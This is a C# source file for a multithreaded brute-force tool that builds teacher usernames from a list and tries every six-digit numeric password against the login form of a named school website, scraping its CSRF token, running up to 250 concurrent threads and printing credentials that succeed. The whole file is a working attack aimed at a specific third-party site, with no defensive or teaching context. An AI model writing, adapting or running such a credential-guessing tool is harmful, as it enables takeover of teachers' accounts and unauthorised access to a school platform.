﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;

namespace MyschoolBrut
{
	class Program
	{
		static int ThreadsCount = 0;
		static String s = "";
		static void Main(string[] args)
		{
			FileStream FS = new FileStream("teachers.txt", FileMode.Open, FileAccess.Read);
			StreamReader SR = new StreamReader(FS);
			String[] teachers = SR.ReadToEnd().Trim().Split(new String[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
			SR.Close();
			FS.Close();
			foreach (String teacher in teachers)
			{
				for (int i = 6; i < 10; i++)
				{
					for (int i1 = 0; i1 < 10; i1++)
						for (int i2 = 0; i2 < 10; i2++)
							for (int i3 = 0; i3 < 10; i3++)
								for (int i4 = 0; i4 < 10; i4++)
									for (int i5 = 0; i5 < 10; i5++)
										for (int i6 = 0; i6 < 10; i6++)
										{
											while (Program.ThreadsCount >= 250) { }
											Thread T = new Thread(LogIn);
											T.IsBackground = true;
											String[] p = new String[] { (teacher + i.ToString()), String.Format("{0}{1}{2}{3}{4}{5}", i1, i2, i3, i4, i5, i6) };
											lock (Program.s)
											{
												Program.ThreadsCount++;
											}
											T.Start(p);
										}
				}
			}
		}

		private static void LogIn(object lp)
		{
			String[] p = (String[])lp;
			String login = p[0];
			String password = p[1];
				Console.WriteLine("Login - {0}, Password - {1}", login, password);
			CookieContainer cookies = new CookieContainer();
			HttpWebRequest request = WebRequest.CreateHttp("http://mz.com.ua/login");
			request.CookieContainer = cookies;
			HttpWebResponse response = (HttpWebResponse)request.GetResponse();
			StreamReader SR = new StreamReader(response.GetResponseStream(), Encoding.Default);
			String page = SR.ReadToEnd();
			SR.Close();
			response.Close();
			Regex regEx = new Regex("value=\"([^\"]*)\"", RegexOptions.Singleline);
			String csrf_token = regEx.Match(page).Groups[1].Value;
			request = WebRequest.CreateHttp("http://mz.com.ua/login");
			request.CookieContainer = cookies;
			request.Method = "POST";
			String postStr = "signin[username]=" + login + "&signin[password]=" + password + "&signin[_csrf_token]=" + csrf_token;
			byte[] postData = Encoding.UTF8.GetBytes(postStr);
			request.ContentLength = postData.Length;
			request.ContentType = "application/x-www-form-urlencoded";
			Stream requestStream = request.GetRequestStream();
			requestStream.Write(postData, 0, postData.Length);
			response = (HttpWebResponse)request.GetResponse();
			Stream responseStream = response.GetResponseStream();
			SR = new StreamReader(responseStream, Encoding.UTF8);
			page = SR.ReadToEnd();
			SR.Close();
			responseStream.Close();
			requestStream.Close();
			if ((new Regex("/logout")).IsMatch(page))
				Console.WriteLine("Login - {0}, Password - {1}", login, password);
			lock (Program.s)
			{
				Program.ThreadsCount--;
			}
		}
	}
}
